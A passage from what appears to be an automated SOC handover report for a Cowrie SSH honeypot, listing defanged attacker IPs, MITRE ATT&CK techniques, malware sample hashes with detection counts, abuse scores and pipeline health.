| `113.160.140[.]138` | 1 | 2026-03-22 22:02 | 2026-03-22 22:02 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.42[.]17` | 1 | 2026-03-22 20:41 | 2026-03-22 20:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `128.24.163[.]102` | 1 | 2026-03-22 22:23 | 2026-03-22 22:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.94.74[.]94` | 1 | 2026-03-22 21:57 | 2026-03-22 21:57 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.179.80[.]12` | 1 | 2026-03-22 20:32 | 2026-03-22 20:33 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.236.192[.]183` | 1 | 2026-03-22 22:18 | 2026-03-22 22:18 | 30s | 0 | `T1592` | 🟢 LOW |
| `49.124.149[.]209` | 1 | 2026-03-22 22:02 | 2026-03-22 22:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `51.68.226[.]171` | 1 | 2026-03-22 21:43 | 2026-03-22 21:43 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.204[.]131` | 1 | 2026-03-22 20:48 | 2026-03-22 20:48 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `91.196.152[.]62` | 1 | 2026-03-22 20:30 | 2026-03-22 20:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]86` | 1 | 2026-03-22 20:30 | 2026-03-22 20:30 | 3s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `123.58.209[.]118` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 12 |
| `51.68.226[.]171` | FR | OVH SAS | **100** ⚠️ | 47 |
| `186.179.80[.]12` | CL | TELEFÓNICA CHILE S.A. (MAYORISTAS) | **100** ⚠️ | 31 |
| `91.196.152[.]86` | FR | FR ONYPHE | **100** ⚠️ | 50 |
| `101.13.5[.]26` | TW | Taiwan Mobile Co., Ltd. | **100** ⚠️ | 15 |
| `109.199.114[.]34` | FR | Contabo GmbH | **100** ⚠️ | 19 |
| `49.124.149[.]209` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 11 |
| `65.20.204[.]131` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 11 |
| `220.169.100[.]15` | CN | CHINANET-HN HUAIHUA node network | **100** ⚠️ | 50 |
| `180.94.74[.]94` | AF | GCN/DCN Networks | **100** ⚠️ | 18 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 48 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 30 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 15 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |

---

## 🔕 False Positive Summary (28 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 27 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 104 cases |
| Tool 34  | Credential Extractor        | ✅ 45 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 26 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 28 filtered (26.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 24 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 15 priority case(s) shown individually · 17 recon entry/entries in table (4 group(s) consolidating 48 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-22T22:23:55Z_
